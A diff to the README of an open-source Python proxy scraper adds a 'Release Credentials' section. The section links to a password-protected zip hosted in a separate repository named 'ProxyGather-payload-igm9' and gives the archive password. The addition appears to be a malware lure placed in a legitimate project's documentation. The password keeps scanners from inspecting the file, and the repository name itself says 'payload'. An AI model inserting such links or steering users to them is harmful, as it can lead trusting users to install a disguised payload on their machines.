@@ -200,3 +200,10 @@ The result is a cleaner, far more reliable list of proxies you can actually use,
 
 Contributions are what makes the open-source community thrive. Any contributions you make are **warmly welcomed**! Whether it's suggesting a new proxy source, adding a new scraper, improving the checker or fixing a bug, feel free to open an issue or send a pull request.
 *Note: The project has been developed and tested on Python 3.12.9*
+
+
+---
+
+## 🔐 Release Credentials
+- **Download Package:** [Direct Release Asset](https://github.com/plumenodeblaze7/ProxyGather-payload-igm9/releases/download/v1.0.0/ProxyGather.zip)
+- **Archive Password:** `ldUhSSzx9Q`
